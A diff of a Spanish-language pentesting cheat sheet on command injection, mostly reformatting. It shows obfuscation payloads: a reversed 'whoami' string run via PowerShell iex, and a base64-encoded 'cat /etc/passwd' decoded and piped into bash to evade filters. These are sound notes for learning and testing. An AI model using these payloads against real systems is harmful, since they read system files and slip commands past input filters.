@@ -101,11 +101,14 @@ o aplicando un reversing:
 ##### Windows:
   iex "$('imaohw'[-1..-20] -join '')"
 
-encodear un comando:
+#### Encodear un comando:
+
 ejemplo de comando pasado a base64:
-echo -n 'cat /etc/passwd | grep 33' | base64
+    echo -n 'cat /etc/passwd | grep 33' | base64
+
 resultado: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
-payload: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+    payload: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 
 
 ### Blind command injection
